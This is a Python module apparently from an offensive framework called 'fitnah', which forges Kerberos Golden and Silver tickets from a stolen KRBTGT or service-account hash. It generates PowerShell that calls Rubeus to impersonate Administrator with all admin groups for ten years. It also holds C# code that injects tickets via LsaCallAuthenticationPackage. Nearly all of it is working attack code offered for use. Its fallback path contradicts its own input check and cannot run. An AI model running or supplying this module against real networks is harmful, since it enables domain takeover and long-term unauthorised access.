"""
credential_access/golden_ticket — Kerberos Golden/Silver ticket forgery. MITRE T1558.001 / T1558.002.
Forges a Kerberos TGT (Golden) using KRBTGT NTLM hash, or a TGS (Silver)
using a service account hash. Injects the forged ticket via LsaCallAuthenticationPackage.
Requires: KRBTGT hash (from DCSync/dump_sam), domain SID, domain name.
"""
from __future__ import annotations

from fitnah.sdk import BasePlugin, ModuleResult
from fitnah.sdk.schema import Param, ParamSchema


class GoldenTicket(BasePlugin):
    NAME        = "golden_ticket"
    DESCRIPTION = "Forge and inject Kerberos Golden/Silver tickets (T1558.001/T1558.002)"
    AUTHOR      = "fitnah-team"
    MITRE       = "T1558.001"
    CATEGORY    = "credential_access"
    VERSION     = "1.0.0"

    schema = ParamSchema().add(
        Param("ticket_type", str, required=False, default="golden",
              help="golden (TGT via KRBTGT) | silver (TGS via service account hash)"),
        Param("krbtgt_hash", str, required=True,
              help="NTLM hash of KRBTGT account (golden) or service account (silver) — 32 hex chars"),
        Param("domain", str, required=False, default="",
              help="AD domain FQDN (auto-detected if blank)"),
        Param("domain_sid", str, required=False, default="",
              help="Domain SID S-1-5-21-... (auto-detected if blank)"),
        Param("target_user", str, required=False, default="Administrator",
              help="Username to impersonate in the forged ticket"),
        Param("groups", str, required=False, default="512,513,518,519,520",
              help="Comma-separated group RIDs to embed (default = all admin groups)"),
        Param("spn", str, required=False, default="",
              help="[Silver only] SPN to target e.g. cifs/dc01.corp.local"),
        Param("duration_days", int, required=False, default=3650,
              help="Ticket validity in days (default: 10 years)"),
    )

    def run(self, session, params, ctx=None) -> ModuleResult:
        if ctx is None:
            return ModuleResult.err("Requires live session")

        ticket_type  = params.get("ticket_type", "golden").lower()
        ntlm_hash    = params.get("krbtgt_hash", "").replace(" ", "").lower()
        domain       = params.get("domain", "")
        domain_sid   = params.get("domain_sid", "")
        target_user  = params.get("target_user", "Administrator")
        groups_str   = params.get("groups", "512,513,518,519,520")
        spn          = params.get("spn", "")
        days         = int(params.get("duration_days", 3650))

        if len(ntlm_hash) != 32 or not all(c in "0123456789abcdef" for c in ntlm_hash):
            return ModuleResult.err("krbtgt_hash must be a 32-character NTLM hex string")

        if ticket_type == "silver" and not spn:
            return ModuleResult.err("spn is required for silver ticket (e.g. cifs/dc01.corp.local)")

        ps = self._build_ps(ticket_type, ntlm_hash, domain, domain_sid,
                            target_user, groups_str, spn, days)
        r  = ctx.ps(ps, timeout=60)
        if r["status"] != "ok":
            return ModuleResult.err(f"golden_ticket failed: {r['output']}")
        return ModuleResult.ok(data=r["output"], loot_kind="golden_ticket")

    @staticmethod
    def _build_ps(ticket_type: str, ntlm_hash: str, domain: str, domain_sid: str,
                  target_user: str, groups_str: str, spn: str, days: int) -> str:
        dom_detect = f"'{domain}'" if domain else "([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).Name"
        sid_detect = (
            f"'{domain_sid}'"
            if domain_sid else
            "(([System.Security.Principal.NTAccount]::new($domain + '\\Domain Admins')).Translate([System.Security.Principal.SecurityIdentifier]).ToString() -replace '-\\d+$','')"
        )
        service_part = f"$spn = '{spn}'" if spn else "$spn = 'krbtgt/' + $domain"
        rubeus_cmd = (
            f"golden /rc4:{ntlm_hash} /user:{target_user} /domain:$domain /sid:$sid /ptt"
            if ticket_type == "golden" else
            f"silver /rc4:{ntlm_hash} /user:{target_user} /domain:$domain /sid:$sid /service:$spn /ptt"
        )

        return f"""
# KerbForge: inject raw kirbi bytes via LsaCallAuthenticationPackage
# Used when operator supplies kirbi_b64 directly (alternate mode)
Add-Type @'
using System;
using System.Runtime.InteropServices;
using System.Text;

public class KerbForge {{
    // KerbSubmitTicketMessage = 21
    const int KerbSubmitTicketMessage = 21;
    const int STATUS_SUCCESS = 0;

    [StructLayout(LayoutKind.Sequential)]
    public struct LSA_STRING {{
        public ushort Length; public ushort MaxLen; public IntPtr Buffer;
    }}
    [StructLayout(LayoutKind.Sequential)]
    public struct KERB_SUBMIT_TKT_REQUEST {{
        public int MessageType;
        public LUID LogonId;
        public int Flags;
        public KERB_CRYPTO_KEY32 Key;
        public int KerbCredSize;
        public int KerbCredOffset;
    }}
    [StructLayout(LayoutKind.Sequential)]
    public struct KERB_CRYPTO_KEY32 {{
        public int KeyType; public int Length; public int Offset;
    }}
    [StructLayout(LayoutKind.Sequential)]
    public struct LUID {{
        public uint LowPart; public int HighPart;
    }}

    [DllImport("secur32.dll")] static extern int LsaConnectUntrusted(out IntPtr LsaHandle);
    [DllImport("secur32.dll")] static extern int LsaLookupAuthenticationPackage(
        IntPtr LsaHandle, ref LSA_STRING PackageName, out uint AuthPackage);
    [DllImport("secur32.dll")] static extern int LsaCallAuthenticationPackage(
        IntPtr LsaHandle, uint AuthPackage, IntPtr ProtocolSubmitBuffer,
        uint SubmitBufferLength, out IntPtr ProtocolReturnBuffer,
        out uint ReturnBufferLength, out int ProtocolStatus);
    [DllImport("secur32.dll")] static extern int LsaFreeReturnBuffer(IntPtr Buffer);
    [DllImport("secur32.dll")] static extern int LsaDeregisterLogonProcess(IntPtr LsaHandle);

    public static string InjectTicket(byte[] ticketBytes) {{
        IntPtr hLsa; int status;
        status = LsaConnectUntrusted(out hLsa);
        if (status != STATUS_SUCCESS) return "ERR:LsaConnect:" + status.ToString("X");

        byte[] kerbName = Encoding.ASCII.GetBytes("Kerberos");
        IntPtr kerbNamePtr = Marshal.AllocHGlobal(kerbName.Length);
        Marshal.Copy(kerbName, 0, kerbNamePtr, kerbName.Length);
        var lsaStr = new LSA_STRING {{
            Length = (ushort)kerbName.Length, MaxLen = (ushort)kerbName.Length,
            Buffer = kerbNamePtr
        }};
        uint authPkg;
        LsaLookupAuthenticationPackage(hLsa, ref lsaStr, out authPkg);
        Marshal.FreeHGlobal(kerbNamePtr);

        int reqSize = Marshal.SizeOf(typeof(KERB_SUBMIT_TKT_REQUEST)) + ticketBytes.Length;
        IntPtr reqBuf = Marshal.AllocHGlobal(reqSize);
        var req = new KERB_SUBMIT_TKT_REQUEST {{
            MessageType = KerbSubmitTicketMessage,
            KerbCredSize = ticketBytes.Length,
            KerbCredOffset = Marshal.SizeOf(typeof(KERB_SUBMIT_TKT_REQUEST))
        }};
        Marshal.StructureToPtr(req, reqBuf, false);
        Marshal.Copy(ticketBytes, 0, reqBuf + Marshal.SizeOf(typeof(KERB_SUBMIT_TKT_REQUEST)), ticketBytes.Length);

        IntPtr retBuf; uint retLen; int protStatus;
        status = LsaCallAuthenticationPackage(hLsa, authPkg, reqBuf, (uint)reqSize,
                                               out retBuf, out retLen, out protStatus);
        if (retBuf != IntPtr.Zero) LsaFreeReturnBuffer(retBuf);
        Marshal.FreeHGlobal(reqBuf);
        LsaDeregisterLogonProcess(hLsa);

        if (status == STATUS_SUCCESS && protStatus == STATUS_SUCCESS)
            return "ok";
        return "ERR:LsaCall:" + status.ToString("X8") + "/proto:" + protStatus.ToString("X8");
    }}
}}
'@

$results = @()
try {{
    $domain = {dom_detect}
    $sid    = {sid_detect}
    {service_part}
    $results += "[*] {ticket_type.title()} ticket — user={target_user} domain=$domain"
    $results += "[*] SID: $sid"

    # Primary path: forge + inject via Rubeus.exe (GhostPack/Rubeus, DEF CON 26)
    $rub = $null
    foreach ($p in @('C:\\Windows\\Temp\\Rubeus.exe','C:\\ProgramData\\Rubeus.exe','C:\\Temp\\Rubeus.exe')) {{
        if (Test-Path $p) {{ $rub = $p; break }}
    }}
    if (-not $rub) {{ $rub = (Get-Command Rubeus.exe -ErrorAction SilentlyContinue)?.Source }}

    if ($rub) {{
        $results += "[*] Rubeus.exe found: $rub"
        $results += "[*] Forging {ticket_type} ticket — user={target_user} duration={days}d"
        $rubeusOut = & $rub {rubeus_cmd} 2>&1
        $results += $rubeusOut
    }} else {{
        # Fallback: inject raw kirbi bytes if provided as base64 in krbtgt_hash (len > 32)
        $nhex = '{ntlm_hash}'
        if ($nhex.Length -gt 32) {{
            $kirbi = [Convert]::FromBase64String($nhex)
            $injectResult = [KerbForge]::InjectTicket($kirbi)
            $results += "[+] Inject result: $injectResult"
        }} else {{
            $results += "[-] Rubeus.exe not found — upload via file_upload first"
            $results += "[*] Or pass full kirbi bytes as base64 in krbtgt_hash parameter"
        }}
    }}
}} catch {{ $results += "[-] $_" }}
$results -join "`n"
""".strip()
